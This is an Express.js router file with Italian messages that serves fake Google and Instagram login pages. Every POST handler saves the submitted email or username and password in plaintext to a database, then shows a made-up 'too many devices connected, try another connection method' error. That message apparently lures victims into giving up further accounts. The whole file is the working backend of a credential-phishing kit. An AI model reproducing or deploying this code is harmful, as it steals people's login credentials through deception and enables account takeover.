const express = require("express"),
  User = require("../models/user"),
  err_message = "Impossibile connettersi: troppi dispositivi connessi con questo metodo di connessione. Riprovare con un altro metodo di connessione  o attendere disponibilità di banda",
  router = express.Router()



router.get('/', (req, res) => {
  res.render('landing')
})

router.post('/', (req, res) => {
  req.flash("error", "Sessione scaduta. Riprovare piú tardi o con un metodo alternativo")
  res.redirect("/")
})

router.get('/google', (req, res) => {
  res.render('google')
})

router.post('/google', (req, res) => {
  let newGoogleUser = new User({
    username: req.body.email,
    password: req.body.password,
    acc_type: 'Google'
  })
  User.create(newGoogleUser, (err, new_user) => {
    if (err) {
      req.flash("error", err.message)
    } else {
      req.flash("error", err_message)
      res.redirect("/")
    }
  })
})

router.get('/instagram', (req, res) => {
  res.render('instagram')
})

router.post('/instagram', (req, res) => {
  let newInstaUser = new User({
    username: req.body.username,
    password: req.body.password,
    acc_type: 'Instagram'
  })
  User.create(newInstaUser, (err, new_user) => {
    if (err) {
      req.flash("error", err.message)
    } else {
      req.flash("error", err_message)
      res.redirect("/")
    }
  })
})

module.exports = router